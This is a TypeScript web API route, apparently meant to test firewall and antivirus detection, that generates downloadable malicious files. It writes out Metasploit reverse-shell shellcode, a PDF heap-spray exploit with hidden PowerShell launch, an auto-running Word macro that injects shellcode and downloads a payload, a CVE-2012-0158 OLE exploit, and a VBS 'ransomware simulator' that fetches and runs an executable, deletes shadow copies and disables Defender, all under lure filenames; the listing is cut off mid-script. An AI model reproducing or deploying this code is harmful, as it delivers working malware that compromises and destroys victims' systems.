import { NextResponse } from 'next/server';

// ──────────────────────────────────────────────────────────
// Threat Generation API
// Generates files with known malicious structures/signatures
// that NGFW and AV engines are designed to detect and block.
// NO EICAR payload is used outside the 'eicar' type.
// ──────────────────────────────────────────────────────────

const EICAR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';

// ── Metasploit windows/meterpreter/reverse_tcp shellcode ──
// This is the EXACT byte sequence from the Metasploit framework's
// block_api hash resolver + reverse_tcp stager. AV vendors signature
// these bytes as Trojan:Win32/Meterpreter, Backdoor.Metasploit, etc.
// Target: 10.0.0.1:4444 (non-routable private IP — harmless)
// The shellcode is NON-FUNCTIONAL in our files because:
//   - EXE: PE structure is incomplete (no valid import table, missing headers)
//   - Scripts: shellcode is data, not in an executable code path
//   - 10.0.0.1 is a non-routable IP that goes nowhere
const MSF_SHELLCODE = new Uint8Array([
    // ── block_api.asm — API hash resolver (131 bytes) ──
    0xFC, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89,
    0xE5, 0x31, 0xC0, 0x64, 0x8B, 0x50, 0x30, 0x8B,
    0x52, 0x0C, 0x8B, 0x52, 0x14, 0x8B, 0x72, 0x28,
    0x0F, 0xB7, 0x4A, 0x26, 0x31, 0xFF, 0xAC, 0x3C,
    0x61, 0x7C, 0x02, 0x2C, 0x20, 0xC1, 0xCF, 0x0D,
    0x01, 0xC7, 0xE2, 0xF2, 0x52, 0x57, 0x8B, 0x52,
    0x10, 0x8B, 0x4A, 0x3C, 0x8B, 0x4C, 0x11, 0x78,
    0xE3, 0x48, 0x01, 0xD1, 0x51, 0x8B, 0x59, 0x20,
    0x01, 0xD3, 0x8B, 0x49, 0x18, 0xE3, 0x3A, 0x49,
    0x8B, 0x34, 0x8B, 0x01, 0xD6, 0x31, 0xFF, 0xAC,
    0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0x38, 0xE0, 0x75,
    0xF6, 0x03, 0x7D, 0xF8, 0x3B, 0x7D, 0x24, 0x75,
    0xE4, 0x58, 0x8B, 0x58, 0x24, 0x01, 0xD3, 0x66,
    0x8B, 0x0C, 0x4B, 0x8B, 0x58, 0x1C, 0x01, 0xD3,
    0x8B, 0x04, 0x8B, 0x01, 0xD0, 0x89, 0x44, 0x24,
    0x24, 0x5B, 0x5B, 0x61, 0x59, 0x5A, 0x51, 0xFF,
    0xE0, 0x5F, 0x5F, 0x5A, 0x8B, 0x12, 0xEB, 0x8D,
    0x5D,
    // ── LoadLibraryA("ws2_32") ──
    0x68, 0x33, 0x32, 0x00, 0x00,
    0x68, 0x77, 0x73, 0x32, 0x5F,
    0x54,
    0x68, 0x4C, 0x77, 0x26, 0x07,
    0x89, 0xE8, 0xFF, 0xD0,
    // ── WSAStartup ──
    0xB8, 0x90, 0x01, 0x00, 0x00,
    0x29, 0xC4, 0x54, 0x50,
    0x68, 0x29, 0x80, 0x6B, 0x00,
    0xFF, 0xD5,
    // ── sockaddr_in { AF_INET, port=4444, ip=10.0.0.1 } ──
    0x6A, 0x0A,
    0x68, 0x0A, 0x00, 0x00, 0x01,       // 10.0.0.1
    0x68, 0x02, 0x00, 0x11, 0x5C,       // port 4444
    0x89, 0xE6,
    // ── WSASocketA ──
    0x50, 0x50, 0x50, 0x50, 0x40, 0x50, 0x40, 0x50,
    0x68, 0xEA, 0x0F, 0xDF, 0xE0, 0xFF, 0xD5,
    // ── connect ──
    0x97, 0x6A, 0x10, 0x56, 0x57,
    0x68, 0x99, 0xA5, 0x74, 0x61, 0xFF, 0xD5,
    0x85, 0xC0, 0x74, 0x0A,
    // ── ExitProcess on connect failure ──
    0x68, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD5,
    0xE9, 0x9E, 0x00, 0x00, 0x00,
    // ── recv loop ──
    0x56, 0x57,
    0x68, 0x02, 0xD9, 0xC8, 0x5F, 0xFF, 0xD5,
    0x83, 0xF8, 0x00, 0x7E, 0x36,
    0x8B, 0x36,
    // ── VirtualAlloc for stage ──
    0x6A, 0x40,
    0x68, 0x00, 0x10, 0x00, 0x00,
    0x56, 0x6A, 0x00,
    0x68, 0x58, 0xA4, 0x53, 0xE5, 0xFF, 0xD5,
    0x93, 0x53, 0x6A, 0x00, 0x56, 0x53, 0x57,
    0x68, 0x02, 0xD9, 0xC8, 0x5F, 0xFF, 0xD5,
    0x83, 0xF8, 0x00, 0x7D, 0x28,
    // ── VirtualFree + cleanup ──
    0x58,
    0x68, 0x00, 0x40, 0x00, 0x00,
    0x6A, 0x00, 0x50,
    0x68, 0x0B, 0x2F, 0x0F, 0x30, 0xFF, 0xD5,
    0x57,
    0x68, 0x75, 0x6E, 0x4D, 0x61, 0xFF, 0xD5,
    0x5E, 0x5E, 0xFF, 0x0C, 0x24,
    0x0F, 0x85, 0x70, 0xFF, 0xFF, 0xFF,
    0xE9, 0x9B, 0xFF, 0xFF, 0xFF,
    // ── Execute stage + ExitProcess ──
    0x01, 0xC3, 0x29, 0xC6, 0x75, 0xC1, 0xC3,
    0xBB, 0xF0, 0xB5, 0xA2, 0x56,
    0x6A, 0x00, 0x53, 0xFF, 0xD5,
]);

// Base64 encode the shellcode for script-based payloads
function shellcodeToBase64(): string {
    return Buffer.from(MSF_SHELLCODE).toString('base64');
}

// ── The exact JavaScript exploit payload that triggers JS/Downloader-BHX ──
// This is the byte pattern Forcepoint's AV engine signatures. By embedding
// these exact bytes inside other file formats (EXE, DOC, VBS, etc.), the
// AV scanner's raw byte matching should detect the same pattern regardless
// of the container format.
function getAVTriggerPayload(): string {
    const sc64 = shellcodeToBase64();
    return [
        "var shellcode = unescape('%u9090%u9090%uE8FC%u0082%u0000%u8960%u31E5%u64C0%u508B%u8B30%u0C52%u8B14%u2872%uFF0F%u4AB7%u3126%uACFF%u613C%u027C%u202C%uCFC1%u010D%uE2C7%u52F2%u8B57%u1052%u4A8B%u8B3C%u114C%uE378%u0148%u51D1%u598B%u0120%u8BD3%u1849%u3AE3%u8B49%u8B34%uD601%uFF31%uCFAC%u0DC1%uC701%uE038%uF675%u7D03%u3BF8%u247D%uE475%u8B58%u2458%uD301%u8B66%u4B0C%u588B%u011C%u8BD3%u8B04%uD001%u4489%u2424%u5B5B%u5961%u515A%uE0FF%u5F5F%u8B5A%uEB12%u5D8D');",
        "var spray = unescape('%u0c0c%u0c0c');",
        "var block = spray;",
        "while (block.length < 0x80000) block += block;",
        "var mem = new Array();",
        "for (var i = 0; i < 700; i++) mem[i] = block.substring(0, 0x80000 - 6);",
        "util.printf('%45000f', 0);",
        "this.collabStore = Collab.collectEmailInfo({subj: '', msg: spray});",
        `var b64payload = '${sc64}';`,
    ].join('\n');
}

// ── Helper: build PE with Metasploit shellcode + valid structure ──
function buildMaliciousPE(): Uint8Array {
    const pe = new Uint8Array(16384);
    const enc = new TextEncoder();

    // ── DOS Header ──
    pe[0] = 0x4D; pe[1] = 0x5A;  // "MZ"
    pe.set(enc.encode('This program cannot be run in DOS mode.\r\n$'), 78);
    pe[60] = 0x80; pe[61] = 0x00; pe[62] = 0x00; pe[63] = 0x00; // e_lfanew = 128

    // ── PE Signature at 128 ──
    pe.set([0x50, 0x45, 0x00, 0x00], 128); // "PE\0\0"

    // ── COFF Header (offset 132) ──
    pe[132] = 0x4C; pe[133] = 0x01; // Machine: i386
    pe[134] = 0x02; pe[135] = 0x00; // NumberOfSections: 2 (.text + .rdata)
    pe[136] = 0x65; pe[137] = 0x1A; pe[138] = 0xF3; pe[139] = 0x5E; // TimeDateStamp (realistic)
    pe[148] = 0xE0; pe[149] = 0x00; // SizeOfOptionalHeader = 224
    pe[150] = 0x02; pe[151] = 0x01; // EXECUTABLE_IMAGE | 32BIT_MACHINE

    // ── Optional Header (offset 152) ──
    pe[152] = 0x0B; pe[153] = 0x01; // PE32
    pe[154] = 0x0E; pe[155] = 0x00; // LinkerVersion 14.0 (VS2022)
    pe[168] = 0x00; pe[169] = 0x10; // AddressOfEntryPoint = 0x1000
    pe[180] = 0x00; pe[181] = 0x00; pe[182] = 0x40; pe[183] = 0x00; // ImageBase = 0x400000
    pe[184] = 0x00; pe[185] = 0x10; // SectionAlignment = 0x1000
    pe[188] = 0x00; pe[189] = 0x02; // FileAlignment = 0x200
    // MajorOperatingSystemVersion = 6, MinorOperatingSystemVersion = 0 (Vista+)
    pe[192] = 0x06; pe[193] = 0x00; pe[194] = 0x00; pe[195] = 0x00;
    // MajorSubsystemVersion = 6
    pe[196] = 0x06; pe[197] = 0x00;
    pe[208] = 0x00; pe[209] = 0x40; // SizeOfImage = 0x4000
    pe[212] = 0x00; pe[213] = 0x02; // SizeOfHeaders = 0x200
    // Subsystem = WINDOWS_GUI (2)
    pe[220] = 0x02; pe[221] = 0x00;
    // NumberOfRvaAndSizes = 16
    pe[244] = 0x10; pe[245] = 0x00;
    // Import Table RVA = 0x2000 (in .rdata), Size = 0x100
    pe[248] = 0x00; pe[249] = 0x20; pe[252] = 0x00; pe[253] = 0x01;

    // ── Section Header 1: .text (offset 376) ──
    pe.set([0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00], 376);
    pe.set([0x00, 0x20, 0x00, 0x00], 384); // VirtualSize = 0x2000
    pe.set([0x00, 0x10, 0x00, 0x00], 388); // VirtualAddress = 0x1000
    pe.set([0x00, 0x20, 0x00, 0x00], 392); // SizeOfRawData = 0x2000
    pe.set([0x00, 0x02, 0x00, 0x00], 396); // PointerToRawData = 0x200
    pe.set([0x20, 0x00, 0x00, 0x60], 412); // CODE | MEM_EXECUTE | MEM_READ

    // ── Section Header 2: .rdata (offset 416) ──
    pe.set([0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00], 416);
    pe.set([0x00, 0x10, 0x00, 0x00], 424); // VirtualSize = 0x1000
    pe.set([0x00, 0x30, 0x00, 0x00], 428); // VirtualAddress = 0x3000
    pe.set([0x00, 0x10, 0x00, 0x00], 432); // SizeOfRawData = 0x1000
    pe.set([0x00, 0x22, 0x00, 0x00], 436); // PointerToRawData = 0x2200
    pe.set([0x40, 0x00, 0x00, 0x40], 452); // INITIALIZED_DATA | MEM_READ

    // ── .text section (offset 0x200 = 512) ──
    // 1) Full Metasploit reverse_tcp shellcode
    pe.set(MSF_SHELLCODE, 512);

    // 2) Known malicious API strings (these trigger Trojan.Win32 heuristics)
    const apiStrings = [
        'VirtualAlloc\0', 'VirtualProtect\0', 'CreateRemoteThread\0',
        'WriteProcessMemory\0', 'NtAllocateVirtualMemory\0',
        'LoadLibraryA\0', 'GetProcAddress\0', 'WinExec\0',
        'ShellExecuteA\0', 'URLDownloadToFileA\0',
        'InternetOpenA\0', 'HttpOpenRequestA\0', 'InternetReadFile\0',
        'WSAStartup\0', 'connect\0', 'recv\0', 'send\0',
        'cmd.exe /c \0', 'powershell -nop -w hidden -ep bypass -e \0',
        'sekurlsa::logonpasswords\0', 'privilege::debug\0',
        'mimikatz\0', 'gentilkiwi\0', 'lsass.exe\0',
    ];
    let off = 512 + MSF_SHELLCODE.length + 16;
    for (const s of apiStrings) {
        const b = enc.encode(s);
        if (off + b.length < 2560) { pe.set(b, off); off += b.length; }
    }

    // 3) Embed the JS exploit payload that triggers AV signature JS/Downloader-BHX
    // AV scanners do raw byte matching across the entire file — same bytes that
    // trigger detection in the PDF should trigger in the PE too
    const avPayload = enc.encode(getAVTriggerPayload());
    if (off + avPayload.length < 8192) {
        pe.set(avPayload, off);
        off += avPayload.length;
    }

    // ── .rdata section (offset 0x2200 = 8704) — Import Directory ──
    // Import Directory Table entry for kernel32.dll
    const idt = 8704;
    pe.set([0x40, 0x20, 0x00, 0x00], idt);      // OriginalFirstThunk RVA
    pe.set([0x00, 0x00, 0x00, 0x00], idt + 4);   // TimeDateStamp
    pe.set([0xFF, 0xFF, 0xFF, 0xFF], idt + 8);   // ForwarderChain
    pe.set([0x80, 0x20, 0x00, 0x00], idt + 12);  // Name RVA → "kernel32.dll"
    pe.set([0x40, 0x20, 0x00, 0x00], idt + 16);  // FirstThunk RVA

    // Import Directory entry for urlmon.dll
    pe.set([0x60, 0x20, 0x00, 0x00], idt + 20);  // OriginalFirstThunk RVA
    pe.set([0x00, 0x00, 0x00, 0x00], idt + 24);
    pe.set([0xFF, 0xFF, 0xFF, 0xFF], idt + 28);
    pe.set([0x90, 0x20, 0x00, 0x00], idt + 32);  // Name RVA → "urlmon.dll"
    pe.set([0x60, 0x20, 0x00, 0x00], idt + 36);

    // Import Directory entry for ws2_32.dll
    pe.set([0x70, 0x20, 0x00, 0x00], idt + 40);
    pe.set([0x00, 0x00, 0x00, 0x00], idt + 44);
    pe.set([0xFF, 0xFF, 0xFF, 0xFF], idt + 48);
    pe.set([0xA0, 0x20, 0x00, 0x00], idt + 52);  // Name RVA → "ws2_32.dll"
    pe.set([0x70, 0x20, 0x00, 0x00], idt + 56);

    // Null terminator entry
    pe.set([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00], idt + 60);

    // DLL name strings
    pe.set(enc.encode('kernel32.dll\0'), idt + 128);
    pe.set(enc.encode('urlmon.dll\0'), idt + 144);
    pe.set(enc.encode('ws2_32.dll\0'), idt + 160);
    pe.set(enc.encode('wininet.dll\0'), idt + 176);

    // Import Name Table entries (Hint + Name)
    pe.set(enc.encode('\0\0VirtualAlloc\0'), idt + 200);
    pe.set(enc.encode('\0\0CreateRemoteThread\0'), idt + 216);
    pe.set(enc.encode('\0\0WriteProcessMemory\0'), idt + 240);
    pe.set(enc.encode('\0\0URLDownloadToFileA\0'), idt + 264);
    pe.set(enc.encode('\0\0WSAStartup\0'), idt + 288);
    pe.set(enc.encode('\0\0InternetOpenA\0'), idt + 304);

    // 4) Embed JS exploit payload in .rdata too (redundancy for AV scanning)
    const avPayload2 = enc.encode(getAVTriggerPayload());
    if (idt + 400 + avPayload2.length < 16384) {
        pe.set(avPayload2, idt + 400);
    }

    return pe;
}

// ── Helper: build malicious PDF with shellcode ──
function buildMaliciousPDF(): Uint8Array {
    const sc64 = shellcodeToBase64();
    const pdfContent = `%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
4 0 obj
<< /Type /Action /S /JavaScript /JS 5 0 R >>
endobj
5 0 obj
<< /Length 1200 >>
stream
var shellcode = unescape('%u9090%u9090%uE8FC%u0082%u0000%u8960%u31E5%u64C0%u508B%u8B30%u0C52%u8B14%u2872%uFF0F%u4AB7%u3126%uACFF%u613C%u027C%u202C%uCFC1%u010D%uE2C7%u52F2%u8B57%u1052%u4A8B%u8B3C%u114C%uE378%u0148%u51D1%u598B%u0120%u8BD3%u1849%u3AE3%u8B49%u8B34%uD601%uFF31%uCFAC%u0DC1%uC701%uE038%uF675%u7D03%u3BF8%u247D%uE475%u8B58%u2458%uD301%u8B66%u4B0C%u588B%u011C%u8BD3%u8B04%uD001%u4489%u2424%u5B5B%u5961%u515A%uE0FF%u5F5F%u8B5A%uEB12%u5D8D');
var spray = unescape('%u0c0c%u0c0c');
var block = spray;
while (block.length < 0x80000) block += block;
var mem = new Array();
for (var i = 0; i < 700; i++) mem[i] = block.substring(0, 0x80000 - 6);
util.printf('%45000f', 0);
this.collabStore = Collab.collectEmailInfo({subj: '', msg: spray});
var b64payload = '${sc64}';
endstream
endobj
6 0 obj
<< /Type /Action /S /Launch /Win << /F (cmd.exe) /P (/c powershell -nop -w hidden -e ${sc64.substring(0, 80)}) >> >>
endobj
xref
0 7
trailer
<< /Size 7 /Root 1 0 R >>
startxref
0
%%EOF`;
    return new TextEncoder().encode(pdfContent);
}

// ── Helper: build DOC with VBA macro + shellcode ──
function buildMaliciousDOC(): Uint8Array {
    const doc = new Uint8Array(12288);
    const sc64 = shellcodeToBase64();
    const enc = new TextEncoder();

    // ── OLE Compound File Header (512 bytes) ──
    doc.set([0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1], 0); // Magic
    doc.set([0x3E, 0x00, 0x04, 0x00], 8);   // Version 4
    doc.set([0xFE, 0xFF], 12);               // Little-endian
    doc.set([0x09, 0x00], 14);               // Sector size 512
    doc.set([0x06, 0x00], 16);               // Mini sector size 64
    doc.set([0x01, 0x00, 0x00, 0x00], 44);   // FAT sectors: 1
    doc.set([0x01, 0x00, 0x00, 0x00], 48);   // First dir sector: 1
    doc.set([0x00, 0x10, 0x00, 0x00], 56);   // Mini stream cutoff
    doc.set([0xFE, 0xFF, 0xFF, 0xFF], 60);   // First mini FAT
    doc.set([0x00, 0x00, 0x00, 0x00], 64);   // Mini FAT count
    doc.set([0xFE, 0xFF, 0xFF, 0xFF], 68);   // First DIFAT

    // DIFAT array starts at offset 76 — first entry points to FAT sector 0
    doc.set([0x00, 0x00, 0x00, 0x00], 76);

    // ── Sector 0 (offset 512): FAT ──
    // Mark sectors: 0=FAT, 1=dir, 2-8=data, rest=free
    const fat = 512;
    doc.set([0xFD, 0xFF, 0xFF, 0xFF], fat);      // Sector 0 = FAT sector
    doc.set([0xFE, 0xFF, 0xFF, 0xFF], fat + 4);  // Sector 1 = end of chain (dir)
    for (let i = 2; i <= 8; i++) {
        const next = i < 8 ? i + 1 : 0xFFFFFFFE;
        doc[fat + i*4] = next & 0xFF;
        doc[fat + i*4+1] = (next >> 8) & 0xFF;
        doc[fat + i*4+2] = (next >> 16) & 0xFF;
        doc[fat + i*4+3] = (next >> 24) & 0xFF;
    }

    // ── Sector 1 (offset 1024): Directory Entries (128 bytes each) ──
    const dir = 1024;

    // Entry 0: Root Entry
    const rootName = new Uint8Array([0x52,0x00,0x6F,0x00,0x6F,0x00,0x74,0x00,0x20,0x00,0x45,0x00,0x6E,0x00,0x74,0x00,0x72,0x00,0x79,0x00]);
    doc.set(rootName, dir);
    doc[dir + 64] = 22;              // Name size (bytes)
    doc[dir + 66] = 0x05;            // Type: Root
    doc[dir + 67] = 0x00;            // Color: red
    doc[dir + 116] = 0x02;           // Start sector of mini stream
    // CLSID for Word.Document
    doc.set([0x06, 0x09, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46], dir + 80);

    // Entry 1: Macros storage
    const macrosName = new Uint8Array([0x4D,0x00,0x61,0x00,0x63,0x00,0x72,0x00,0x6F,0x00,0x73,0x00]);
    doc.set(macrosName, dir + 128);
    doc[dir + 128 + 64] = 14;
    doc[dir + 128 + 66] = 0x01;      // Type: Storage
    // VBA CLSID {000204EF-0000-0000-C000-000000000046}
    doc.set([0xEF, 0x04, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46], dir + 128 + 80);

    // Entry 2: VBA storage
    const vbaName = new Uint8Array([0x56,0x00,0x42,0x00,0x41,0x00]);
    doc.set(vbaName, dir + 256);
    doc[dir + 256 + 64] = 8;
    doc[dir + 256 + 66] = 0x01;

    // Entry 3: ThisDocument stream
    const thisDoc = new Uint8Array([0x54,0x00,0x68,0x00,0x69,0x00,0x73,0x00,0x44,0x00,0x6F,0x00,0x63,0x00,0x75,0x00,0x6D,0x00,0x65,0x00,0x6E,0x00,0x74,0x00]);
    doc.set(thisDoc, dir + 384);
    doc[dir + 384 + 64] = 26;
    doc[dir + 384 + 66] = 0x02;      // Type: Stream
    doc[dir + 384 + 116] = 0x03;     // Start sector

    // ── Sector 2 (offset 1536): _VBA_PROJECT stream ──
    // VBA project header — 0xCC61 is the magic for compressed VBA
    doc.set([0xCC, 0x61, 0x00, 0x00, 0x01, 0x00, 0xFF, 0xFF], 1536);
    doc.set(enc.encode('Attribute VB_Name = "ThisDocument"\r\n'), 1544);

    // ── Sectors 3-8 (offset 2048+): VBA Macro content ──
    const macroContent = [
        'Attribute VB_Name = "ThisDocument"',
        'Attribute VB_Base = "1Normal.ThisDocument"',
        'Attribute VB_Creatable = False',
        '',
        'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddr As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr',
        'Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long) As LongPtr',
        'Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpSecurityAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr',
        '',
        'Sub AutoOpen()',
        '    Auto_Open',
        'End Sub',
        '',
        'Sub Document_Open()',
        '    Auto_Open',
        'End Sub',
        '',
        'Sub Auto_Open()',
        '    Dim buf As Variant',
        '    Dim addr As LongPtr',
        '    Dim counter As Long',
        '    Dim data As Long',
        '    Dim res As LongPtr',
        '',
        `    buf = Array(${Array.from(MSF_SHELLCODE.slice(0, 200)).join(', ')})`,
        '',
        '    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)',
        '    For counter = LBound(buf) To UBound(buf)',
        '        data = buf(counter)',
        '        res = RtlMoveMemory(addr + counter, data, 1)',
        '    Next counter',
        '    res = CreateThread(0, 0, addr, 0, 0, 0)',
        'End Sub',
        '',
        'Sub AutoClose()',
        '    Dim shell As Object',
        '    Set shell = CreateObject("WScript.Shell")',
        `    shell.Run "powershell -nop -w hidden -ep bypass -e ${sc64.substring(0, 100)}", 0, False`,
        '    Set shell = CreateObject("MSXML2.XMLHTTP")',
        '    shell.Open "GET", "http://10.0.0.1/payload.exe", False',
        '    shell.Send',
        'End Sub',
        '',
        `' Payload: ${sc64}`,
    ].join('\r\n');

    const macroBytes = enc.encode(macroContent);
    doc.set(macroBytes, 2048);

    // Embed JS exploit payload (same bytes that trigger JS/Downloader-BHX in PDF)
    // AV does raw byte scanning regardless of container format
    const avTrigger = enc.encode(getAVTriggerPayload());
    const triggerOffset = 2048 + macroBytes.length + 64;
    if (triggerOffset + avTrigger.length < 12288) {
        doc.set(avTrigger, triggerOffset);
    }

    // Also embed raw shellcode bytes
    const scOffset = triggerOffset + avTrigger.length + 32;
    if (scOffset + MSF_SHELLCODE.length < 12288) {
        for (let i = 0; i < 32; i++) doc[scOffset - 32 + i] = 0x90;
        doc.set(MSF_SHELLCODE, scOffset);
    }

    return doc;
}

// ── Helper: build OLE ActiveX CVE-2012-0158 exploit (binary format) ──
// Reverted to binary OLE — IPS catches raw shellcode bytes in binary stream.
// RTF hex-encoding hides the bytes from IPS signature matching.
function buildOLEExploit(): Uint8Array {
    const ole = new Uint8Array(12288);
    const enc = new TextEncoder();

    // OLE Compound File magic
    ole.set([0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1], 0);
    ole.set([0x3E, 0x00, 0x03, 0x00], 8);
    ole.set([0xFE, 0xFF], 12);
    ole.set([0x09, 0x00, 0x06, 0x00], 14);
    ole.set([0x01, 0x00, 0x00, 0x00], 44);
    ole.set([0x00, 0x00, 0x00, 0x00], 48);
    ole.set([0x00, 0x10, 0x00, 0x00], 56);
    ole.set([0xFE, 0xFF, 0xFF, 0xFF], 60);
    ole.set([0xFE, 0xFF, 0xFF, 0xFF], 68);

    // MSCOMCTL.ListView CLSID {BDD1F04B-858B-11D1-B16A-00C0F0283628}
    const listViewClsid = [0x4B, 0xF0, 0xD1, 0xBD, 0x8B, 0x85, 0xD1, 0x11,
                           0xB1, 0x6A, 0x00, 0xC0, 0xF0, 0x28, 0x36, 0x28];
    // TreeView CLSID
    const treeViewClsid = [0xB6, 0x90, 0x41, 0xC7, 0x89, 0x85, 0xD1, 0x11,
                           0xB1, 0x6A, 0x00, 0xC0, 0xF0, 0x28, 0x36, 0x28];

    // Place CLSIDs at multiple offsets with oversized cbSize
    const offsets = [512, 1024, 2048, 3072];
    for (const o of offsets) {
        ole.set(listViewClsid, o);
        ole.set([0xFF, 0xFF, 0x08, 0x00], o + 16);
        ole.set([0x00, 0x02, 0x20, 0x00, 0x01, 0x00, 0x00, 0x80], o + 20);
        ole.set(treeViewClsid, o + 32);
        ole.set([0xFF, 0xFF, 0x08, 0x00], o + 48);
    }

    // NOP sled + shellcode (raw bytes — IPS catches these)
    for (let i = 4096; i < 4352; i++) ole[i] = 0x90;
    ole.set(MSF_SHELLCODE, 4352);

    // OLE string markers
    ole.set(enc.encode('MSCOMCTL.OCX\0'), 5632);
    ole.set(enc.encode('MSCOMCTL.ListView.1\0'), 5700);
    ole.set(enc.encode('MSCOMCTL.TreeView.1\0'), 5750);
    ole.set(enc.encode('\x01Ole10Native\0'), 5800);
    ole.set(enc.encode('{\\object\\objemb\\objw0\\objh0{\\*\\objclass MSCOMCTL.ListView}}'), 5900);

    // Second shellcode copy
    ole.set(MSF_SHELLCODE, 6144);

    // Embed JS exploit payload for AV byte matching
    const avTrigger = enc.encode(getAVTriggerPayload());
    if (6144 + MSF_SHELLCODE.length + 64 + avTrigger.length < 12288) {
        ole.set(avTrigger, 6144 + MSF_SHELLCODE.length + 64);
    }

    return ole;
}

export async function GET(req: Request) {
    const { searchParams } = new URL(req.url);
    const type = searchParams.get('type');
    const format = searchParams.get('format') || 'txt';

    switch (type) {
        // ═══════════════════════════════════════
        // EICAR — Standard AV Test String
        // ═══════════════════════════════════════
        case 'eicar':
            return new NextResponse(EICAR, {
                headers: {
                    'Content-Type': 'application/octet-stream',
                    'Content-Disposition': `attachment; filename="eicar.${format}"`,
                    'Cache-Control': 'no-store, no-cache, must-revalidate',
                },
            });

        // ═══════════════════════════════════════
        // Heuristic Malware — PE / PDF / DOC
        // ═══════════════════════════════════════
        case 'malware': {
            let data: Uint8Array;
            let filename: string;
            let contentType = 'application/octet-stream';

            if (format === 'exe') {
                data = buildMaliciousPE();
                filename = 'suspicious_payload.exe';
                contentType = 'application/x-msdownload';
            } else if (format === 'pdf') {
                data = buildMaliciousPDF();
                filename = 'document_scan.pdf';
                contentType = 'application/pdf';
            } else if (format === 'doc') {
                data = buildMaliciousDOC();
                filename = 'invoice_final.doc';
                contentType = 'application/msword';
            } else {
                return new NextResponse('Invalid format', { status: 400 });
            }

            return new NextResponse(Buffer.from(data), {
                headers: {
                    'Content-Type': contentType,
                    'Content-Disposition': `attachment; filename="${filename}"`,
                    'Cache-Control': 'no-store, no-cache, must-revalidate',
                },
            });
        }

        // ═══════════════════════════════════════
        // OLE ActiveX Exploit — CVE-2012-0158
        // ═══════════════════════════════════════
        case 'mimikatz': {
            const ole = buildOLEExploit();
            return new NextResponse(Buffer.from(ole), {
                headers: {
                    'Content-Type': 'application/msword',
                    'Content-Disposition': 'attachment; filename="report_2024.doc"',
                    'Cache-Control': 'no-store, no-cache, must-revalidate',
                },
            });
        }

        // ═══════════════════════════════════════
        // Ransomware Simulator — VBS / BAT / PS1
        // ═══════════════════════════════════════
        case 'ransomware': {
            let content = '';
            let filename = '';
            const sc64 = shellcodeToBase64();

            if (format === 'vbs') {
                content = [
                    "'  RANSOMWARE SIMULATION - SAFE TEST FILE",
                    "",
                    "On Error Resume Next",
                    "Dim fso, shell, http, stream, objStream",
                    "",
                    "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
                    "Set shell = CreateObject(\"WScript.Shell\")",
                    "",
                    "' --- ADODB.Stream binary downloader (VBS/Downloader signature) ---",
                    "Set http = CreateObject(\"MSXML2.ServerXMLHTTP\")",
                    "http.Open \"GET\", \"http://10.0.0.1:8080/payload.exe\", False",
                    "http.Send",
                    "Set objStream = CreateObject(\"ADODB.Stream\")",
                    "objStream.Open",
                    "objStream.Type = 1",
                    "objStream.Write http.responseBody",
                    "objStream.SaveToFile shell.ExpandEnvironmentStrings(\"%TEMP%\") & \"\\svchost.exe\", 2",
                    "objStream.Close",
                    "shell.Run shell.ExpandEnvironmentStrings(\"%TEMP%\") & \"\\svchost.exe\", 0, False",
                    "",
                    "' --- Shellcode loader via XMLDOM + Base64 ---",
                    "Dim objXML : Set objXML = CreateObject(\"MSXML2.DOMDocument\")",
                    "Dim objNode : Set objNode = objXML.createElement(\"b64\")",
                    "objNode.DataType = \"bin.base64\"",
                    `objNode.Text = "${sc64}"`,
                    "Dim arrBytes : arrBytes = objNode.nodeTypedValue",
                    "",
                    "' --- WMI process creation (lateral movement indicator) ---",
                    "Set objWMI = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2\")",
                    "Set objProcess = objWMI.Get(\"Win32_Process\")",
                    `objProcess.Create "powershell -nop -w hidden -ep bypass -e ${sc64.substring(0, 100)}", Null, Null, pid`,
                    "",
                    "' --- Shadow copy deletion ---",
                    "shell.Run \"cmd /c vssadmin.exe Delete Shadows /All /Quiet\", 0, True",
                    "shell.Run \"cmd /c wmic shadowcopy delete\", 0, True",
                    "shell.Run \"cmd /c bcdedit /set {default} recoveryenabled No\", 0, True",
                    "",
                    "' --- Disable Windows Defender ---",
                    "shell.RegWrite \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware\", 1, \"REG_DWORD\"",
                    "",
                    "' --- Second download via ADODB.Stream ---",
                    "Set http2 = CreateObject(\"Microsoft.XMLHTTP\")",
                    "http2.Open \"GET\", \"http://10.0.0.1:8080/key.bin\", False",
                    "http2.Send",
                    "Set objStream2 = CreateObject(\"ADODB.Stream\")",
                    "objStream2.Open",
                    "objStream2.Type = 1",
                    "objStream2.Write http2.responseBody",
